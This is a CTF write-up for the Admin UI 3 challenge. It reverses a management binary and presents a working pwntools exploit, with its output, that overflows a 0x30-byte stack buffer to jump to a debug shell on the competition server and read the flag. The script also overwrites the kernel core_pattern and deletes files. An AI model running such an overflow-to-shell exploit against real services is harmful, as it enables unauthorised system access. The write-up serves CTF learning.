# ADMIN UI 3
PWN-RE

## Description:
> The code quality here is terrible. Even the temperature scale is measured in "Kevins". Just bad Q/A all around here. If they choose to measure in Kevins rather than Kelvins, then it's a sure bet that they can't handle their memory properly. It looks like this also controls the SmartFridge2000 internal temperature for that whole home "just-works" experience.


## Solution:

Ok, so based on our progress from [Admin UI 2](Admin_UI_2.md), we're authenticated. What can we do now?

Here's an overview of the `sym.command_line` function which gets called once we're authenticated:
```
                                       .--------------------.
                                       | [0x4141428e]       |
                                       `--------------------'
                                           v
                                           |
                                       .---'
    .----------------------------------------------.
    |.-------------------------------------------. |
    ||                                 |       .-|-|--------------------------------------------------------------------------------------------------------------------------------------.
    ||.--------------------------------------. | | |                                                                                                                                      |
    |||.-----------------------------------. | | | |                                                                                                                                      |
    ||||                               | .-|-|-|-|-|-----------------------------------------------------------.                                                                          |
    ||||                               | | | | | | |                                                           |                                                                          |
    ||||                         .---------------------------------.                                           |                                                                          |
    ||||                         |  0x4141429a [gf]                |                                           |                                                                          |
    ||||                         | 0x414142a6 call sym.imp.printf  |                                           |                                                                          |
    ||||                         | 0x414142b2 call sym.getsx_char  |                                           |                                                                          |
    ||||                         | 0x414142ca str.quit             |                                           |                                                                          |
    ||||                         | 0x414142d4 call sym.imp.strcmp  |                                           |                                                                          |
    ||||                         `---------------------------------'                                           |                                                                          |
    ||||                                 f t                                                                   |                                                                          |
    ||||                                 | |                                                                   |                                                                          |
    ||||                                 | '------------------.                                                |                                                                          |
    ||||    .----------------------------'                    |                                                |                                                                          |
    ||||    |                                                 |                                                |                                                                          |
    ||||.-------------------------------.                 .---------------------------------.                  |                                                                          |
    |||||  0x414142dd [gi]              |                 |  0x414142ee [ge]                |                  |                                                                          |
    ||||| 0x414142dd str.Bye            |                 | 0x414142f2 str.version          |                  |                                                                          |
    ||||| 0x414142e4 call sym.imp.puts  |                 | 0x414142fc call sym.imp.strcmp  |                  |                                                                          |
    ||||`-------------------------------'                 `---------------------------------'                  |                                                                          |
    ||||    v                                                   t f                                            |                                                                          |
    ||||    |                                                   | |                                            |                                                                          |
    ||||    '----.                                              | |                                            |                                                                          |
    ||||         |                         .--------------------' |                                            |                                                                          |
    ||||         |                         |                      '--------------.                             |                                                                          |
    ||||         |                         |                                     |                             |                                                                          |
    ||||     .--------------------.    .---------------------------------.   .-------------------------------. |                                                                          |
    ||||     |  0x4141443c [gh]   |    |  0x41414313 [gj]                |   |  0x41414305 [gk]              | |                                                                          |
    ||||     `--------------------'    | 0x41414317 str.shell            |   | 0x41414305 str.Version_0.3    | |                                                                          |
    ||||                               | 0x41414321 call sym.imp.strcmp  |   | 0x4141430c call sym.imp.puts  | |                                                                          |
    ||||                               `---------------------------------'   `-------------------------------' |                                                                          |
    ||||                                       f t                               v                             |                                                                          |
    ||||                                       | |                               |                             |                                                                          |
    ||||                                       | |                               `-----------------------------'                                                                          |
    ||||                                       | |                               `-----------------------------'                                                                          |
    ||||                                       | '-----------------------------------------------------------------------------------------------------.                                  |
    ||||                                       '-------------------------------------------------------------------------.                             |                                  |
    ||||                                                                                                                 |                             |                                  |
    ||||                                                                                                             .--------------------.        .----------------------------------.   |
    ||||                                                                                                             |  0x4141432a [gn]   |        |  0x41414353 [gl]                 |   |
    ||||                                                                                                             `--------------------'        | 0x4141435c str.echo              |   |
    ||||                                                                                                                   t f                     | 0x41414366 call sym.imp.strncmp  |   |
    ||||                                                                                                                   | |                     `----------------------------------'   |
    ||||                                                                                                                   | |                           t f                              |
    ||||                                                                                                                   | |                           | |                              |
    ||||                                                                    .----------------------------------------------' |                           | |                              |
    ||||    .----------------------------------------------------------------------------------------------------------------'                           | |                              |
    ||||    |                                                               |                                     .--------------------------------------' |                              |
    ||||    |                                                               |                                     |                                     .--'                              |
    ||||    |                                                               |                                     |                                     |                                 |
    ||||.----------------------------------------------------------.    .---------------------------------.   .---------------------------------.   .----------------------------------.  |
    |||||  0x41414338 [go]                                         |    |  0x41414349 [gm]                |   |  0x41414393 [gr]                |   |  0x4141436f [gt]                 |  |
    ||||| 0x41414338 str.Security_made_us_disable_the_shell__sorry |    | 0x41414349 call sym.debug_shell |   | 0x41414397 str.debug            |   | 0x4141437f call sym.imp.printf   |  |
    ||||| 0x4141433f call sym.imp.puts                             |    `---------------------------------'   | 0x414143a1 call sym.imp.strcmp  |   | 0x41414389 call sym.imp.putchar  |  |
    ||||`----------------------------------------------------------'        v                                 `---------------------------------'   `----------------------------------'  |
    ||||    v                                                               |                                         f t                               v                                 |
    ||||    |                                                               |                                         | |                               |                                 |
    |||`----'                                                               |                                         | |                               |                                 |
    ||`---------------------------------------------------------------------'                                         | |                               |                                 |
    ||                                                                                                                | |                               `---------------------------------'
    ||                                                                                                                | '--------------.
    ||                                                                               .--------------------------------'                |
    ||                                                                               |                                                 |
    ||                                                                           .---------------------------------------------.   .------------------------------------.
    ||                                                                           |  0x414143aa [gy]                            |   |  0x4141441f [gu]                   |
    ||                                                                           | 0x414143aa str.Debug_data_dump:             |   | 0x41414426 str.Unknown_command___s |
    ||                                                                           | 0x414143b1 call sym.imp.puts                |   | 0x41414432 call sym.imp.printf     |
    ||                                                                           | 0x414143bc call sym.imp.getpid              |   `------------------------------------'
    ||                                                                           | 0x414143cc str.pid__d_cmds_executed__p___d  |       v
    ||                                                                           | 0x414143d8 call sym.imp.printf              |       |
    ||                                                                           | 0x414143dd call sym.imp.getpid              |       |
    ||                                                                           | 0x414143eb str.cat__proc__d_maps            |       |
    ||                                                                           | 0x414143fa call sym.imp.sprintf             |       |
    ||                                                                           | 0x414143ff str.Mappings:                    |       |
    ||                                                                           | 0x41414406 call sym.imp.puts                |       |
    ||                                                                           | 0x41414415 call sym.imp.system              |       |
    ||                                                                           `---------------------------------------------'       |
    ||                                                                               v                                                 |
    ||                                                                               |                                                 |
    |`-------------------------------------------------------------------------------'                                                 |
    `----------------------------------------------------------------------------------------------------------------------------------'
```

It basically supports several commands:
* quit
* version
* shell
* echo
* debug

Obviously `shell` looks like a good place to start, but is protected by some basic boolean check:
```
                                                                                                   |                                          
                                                                                               .--------------------------------------------. 
                                                                                               |  0x4141432a [gn]                           | 
                                                                                               | ; [0x41616138:1]=0                         | 
                                                                                               | movzx eax, byte [obj.shell_enabled]        | 
                                                                                               | xor eax, 1                                 | 
                                                                                               | test al, al                                | 
                                                                                               | je 0x41414349;[gm]                         | 
                                                                                               `--------------------------------------------' 
                                                                                                     t f               
                                                                                                     | |               
                                                                                                     | |               
                                                                                                     | |               
                                                                                                     | |               
                                                                                                     | |               
                                                                                                     | |               
                                                                                            .--------' |               
                        .------------------------------------------------------------------------------'               
                        |                                                                   |                          
                        |                                                                   |                          
                        |                                                                   |                          
                    .---------------------------------------------------------------.   .-----------------------------.
                    |  0x41414338 [go]                                              |   |  0x41414349 [gm]            |
                    | ; 0x41414a98                                                  |   | call sym.debug_shell;[gp]   |
                    | ; "Security made us disable the shell, sorry!"                |   | jmp 0x4141429a;[gf]         |
                    | lea rdi, str.Security_made_us_disable_the_shell__sorry        |   `-----------------------------'
                    | ; int puts(const char *s)                                     |       v                          
                    | call sym.imp.puts;[gg]                                        |       |                          
                    | jmp 0x4141429a;[gf]                                           |       |                          
                    `---------------------------------------------------------------'       |
```

`debug` gives us some useful information for an attack:
```
> Debug data dump:
 pid=1 cmds executed=0x41616134->1 Mappings:
00400000-00401000 r-xp 00000000 08:01 534875                             /home/user/main
41414000-41415000 r-xp 00014000 08:01 534875                             /home/user/main
41615000-41616000 r--p 00015000 08:01 534875                             /home/user/main
41616000-41617000 rw-p 00016000 08:01 534875                             /home/user/main
42533000-42565000 rw-p 00000000 00:00 0                                  [heap]
7f8471c8e000-7f8471e4e000 r-xp 00000000 08:01 537787                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8471e4e000-7f847204e000 ---p 001c0000 08:01 537787                     /lib/x86_64-linux-gnu/libc-2.23.so
7f847204e000-7f8472052000 r--p 001c0000 08:01 537787                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8472052000-7f8472054000 rw-p 001c4000 08:01 537787                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8472054000-7f8472058000 rw-p 00000000 00:00 0
7f8472058000-7f847206e000 r-xp 00000000 08:01 537808                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f847206e000-7f847226d000 ---p 00016000 08:01 537808                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f847226d000-7f847226e000 rw-p 00015000 08:01 537808                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f847226e000-7f8472376000 r-xp 00000000 08:01 537819                     /lib/x86_64-linux-gnu/libm-2.23.so
7f8472376000-7f8472575000 ---p 00108000 08:01 537819                     /lib/x86_64-linux-gnu/libm-2.23.so
7f8472575000-7f8472576000 r--p 00107000 08:01 537819                     /lib/x86_64-linux-gnu/libm-2.23.so
7f8472576000-7f8472577000 rw-p 00108000 08:01 537819                     /lib/x86_64-linux-gnu/libm-2.23.so
7f8472577000-7f84726e9000 r-xp 00000000 08:01 540467                     /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
7f84726e9000-7f84728e9000 ---p 00172000 08:01 540467                     /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
7f84728e9000-7f84728f3000 r--p 00172000 08:01 540467                     /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
7f84728f3000-7f84728f5000 rw-p 0017c000 08:01 540467                     /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
7f84728f5000-7f84728f9000 rw-p 00000000 00:00 0
7f84728f9000-7f847291f000 r-xp 00000000 08:01 537767                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8472b16000-7f8472b1c000 rw-p 00000000 00:00 0
7f8472b1e000-7f8472b1f000 r--p 00025000 08:01 537767                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8472b1f000-7f8472b20000 rw-p 00026000 08:01 537767                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8472b20000-7f8472b21000 rw-p 00000000 00:00 0
7ffedfba5000-7ffedfbc6000 rw-p 00000000 00:00 0                          [stack]
7ffedfbcd000-7ffedfbd0000 r--p 00000000 00:00 0                          [vvar]
7ffedfbd0000-7ffedfbd2000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

Notice how `debug` provides us with the address of `obj.cmds_executed`: `cmds executed=0x41616134->1`
```
 .--------------------------------------------------. 
 |  0x414143aa [gy]                                 | 
 | ; 0x41414ace                                     | 
 | ; "Debug data dump:"                             | 
 | lea rdi, str.Debug_data_dump:                    | 
 | ; int puts(const char *s)                        | 
 | call sym.imp.puts;[gg]                           | 
 | ; [0x41616134:4]=0                               | 
 | mov ebx, dword [obj.cmds_executed]               | 
 | ; int getpid(void)                               | 
 | call sym.imp.getpid;[gv]                         | 
 | mov ecx, ebx                                     | 
 | ; 0x41616134                                     | 
 | lea rdx, obj.cmds_executed                       | 
 | mov esi, eax                                     | 
 | ; 0x41414adf                                     | 
 | ; " pid=%d cmds executed=%p->%d"                 | 
 | lea rdi, str.pid__d_cmds_executed__p___d         | 
 | mov eax, 0                                       | 
 | ; int printf(const char *format)                 | 
 | call sym.imp.printf;[gb]                         | 
 | ; int getpid(void)                               | 
 | call sym.imp.getpid;[gv]                         | 
 | mov edx, eax                                     | 
 | lea rax, [local_130h]                            | 
 | ; 0x41414afc                                     | 
 | ; "cat /proc/%d/maps"                            | 
 | lea rsi, str.cat__proc__d_maps                   | 
 | mov rdi, rax                                     | 
 | mov eax, 0                                       | 
 | ; int sprintf(char *s, const char *format, ...)  | 
 | call sym.imp.sprintf;[gw]                        | 
 | ; 0x41414b0e                                     | 
 | ; " Mappings:"                                   | 
 | lea rdi, str.Mappings:                           | 
 | ; int puts(const char *s)                        | 
 | call sym.imp.puts;[gg]                           | 
 | lea rax, [local_130h]                            | 
 | mov rdi, rax                                     | 
 | ; int system(const char *string)                 | 
 | call sym.imp.system;[gx]                         | 
 | jmp 0x4141429a;[gf]                              | 
 `--------------------------------------------------' 
```

Using Radare2's flag-space dump combined with its `grep` syntax ("`~`"), we see that `obj.cmds_executed` is right next to `obj.shell_enabled`:
```
[0x41414150]> fs symbols
[0x41414150]> f~obj.cmds_executed,obj.shell_enabled
0x41616134 4 obj.cmds_executed
0x41616138 1 obj.shell_enabled
```

So we know the runtime address of `obj.shell_enabled`. Combined with the following format string vulnerability, we can override `obj.shell_enabled`:
```
 .-----------------------------------. 
 |  0x4141436f [gt]                  | 
 | lea rax, [input]                  | 
 | add rax, 5                        | 
 | mov rdi, rax                      | 
 | mov eax, 0                        | 
 | ; int printf(const char *format)  | 
 | call sym.imp.printf;[gb]          | 
 | mov edi, 0xa                      | 
 | ; int putchar(int c)              | 
 | call sym.imp.putchar;[gs]         | 
 | jmp 0x4141429a;[gf]               | 
 `-----------------------------------'
```

But there is actually an easier way in - buffer overflow:
```
 .-----------------------------------------------.
 |  0x4141429a [gf]                              |
 | ; "> "                                        |
 | lea rdi, [0x41414a6b]                         |
 | mov eax, 0                                    |
 | ; int printf(const char *format)              |
 | call sym.imp.printf;[gb]                      |
 | lea rax, [input]                              |
 | mov rdi, rax                                  |
 | call sym.getsx_char;[gc]                      |
 | ; [0x41616134:4]=0                            |
```

`sym.getsx_char` never checks the length of the buffer it reads. The input buffer is just 0x30 bytes long: `; var int input @ rbp-0x30`.

Therefore, using the buffer overflow, we can overrun the return address to the following function:
```
[0x4141428e]> s sym.debug_shell
[0x41414227]> pdf
/ (fcn) sym.debug_shell 19
|   sym.debug_shell ();
|           ; CALL XREF from sym.command_line (0x41414349)
|           0x41414227      55             push rbp
|           0x41414228      4889e5         mov rbp, rsp
|           0x4141422b      488d3d310800.  lea rdi, str.bin_sh         ; 0x41414a63 ; "/bin/sh"
|           0x41414232      e8a9c8febe     call sym.imp.system         ; int system(const char *string)
|           0x41414237      90             nop
|           0x41414238      5d             pop rbp
\           0x41414239      c3             ret
[0x41414227]>
```

And we get a shell.

The script:
```python
from pwn import *
import os

context(arch='amd64', os='linux', bits = '64')
LOCAL_PATH = "./admin_ui_2"

MENU_START = "=== Management Interface ===\n"

def read_menu(proc):
    proc.recvuntil("3) Quit")

def read_notes(proc, path):
    read_menu(proc)
    proc.sendline("2")
    proc.sendlineafter("Which patchnotes should be shown?\n", path)
    log.info("Read EULA/patch notes: {}".format(path))
    out = proc.recvuntil(MENU_START, drop=True)
    return out

def service_access(proc, password1, password2):
    log.info("Requesting service with Password1: {}, Password2: {}".format(password1, password2))
    read_menu(proc)
    proc.sendline("1")
    proc.sendlineafter("Please enter the backdoo^Wservice password:\n", password1)
    proc.sendlineafter("Please enter secret secondary password:\n", password2)
    proc.recvuntil("Authenticated\n")


def enter_command(proc, cmd):
    log.info("Sending command: {} ({})".format(cmd, enhex(cmd)))
    proc.sendlineafter("> ", cmd)

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(LOCAL_PATH)
    login(proc)
    payload = cyclic(100, n = 8)
    enter_command(proc, payload)
    enter_command(proc, "quit")
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = 8)
    log.info("Overflow offset: {}".format(offset))
    return offset

def login(proc):
    service_access(proc, "CTF{I_luv_buggy_sOFtware}", cyclic(0x23))

offset = get_overflow_offset()

elf = ELF(LOCAL_PATH)


r = remote("mngmnt-iface.ctfcompetition.com", 1337)
login(r)
debug_shell_address = elf.symbols["_Z11debug_shellv"]
log.info("Address of debug_shell: {}".format(hex(debug_shell_address)))
enter_command(r, fit({offset: debug_shell_address}))
enter_command(r, "quit")
r.interactive()
```

The output:
```
root@kali:/media/sf_CTFs/google/adminui2# python exploit2.py
[+] Starting local process './admin_ui_2': pid 2890
[*] Requesting service with Password1: CTF{I_luv_buggy_sOFtware}, Password2: aaaabaaacaaadaaaeaaafaaagaaahaaaiaa
[*] Sending command: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa (6161616161616161626161616161616163616161616161616461616161616161656161616161616166616161616161616761616161616161686161616161616169616161616161616a616161616161616b616161616161616c616161616161616d616161)
[*] Sending command: quit (71756974)
[*] Process './admin_ui_2' stopped with exit code -11 (SIGSEGV) (pid 2890)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/google/adminui2/core.2890'
    Arch:      amd64-64-little
    RIP:       0x41414445
    RSP:       0x7ffcc442af18
    Exe:       '/media/sf_CTFs/google/adminui2/admin_ui_2' (0x41414000)
    Fault:     0x6161616161616168
[*] Overflow offset: 56
[*] '/media/sf_CTFs/google/adminui2/admin_ui_2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to mngmnt-iface.ctfcompetition.com on port 1337: Done
[*] Requesting service with Password1: CTF{I_luv_buggy_sOFtware}, Password2: aaaabaaacaaadaaaeaaafaaagaaahaaaiaa
[*] Address of debug_shell: 0x41414227
[*] Sending command: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa'BAA\x00\x00\x00\x00 (6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161612742414100000000)
[*] Sending command: quit (71756974)
[*] Switching to interactive mode
Bye!
$ ls
an0th3r_fl44444g_yo
flag
main
patchnotes
$ cat an0th3r_fl44444g_yo
CTF{c0d3ExEc?W411_pL4y3d}
$ exit
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to mngmnt-iface.ctfcompetition.com port 1337
[*] Got EOF while sending in interactive
```

The flag: CTF{c0d3ExEc?W411_pL4y3d}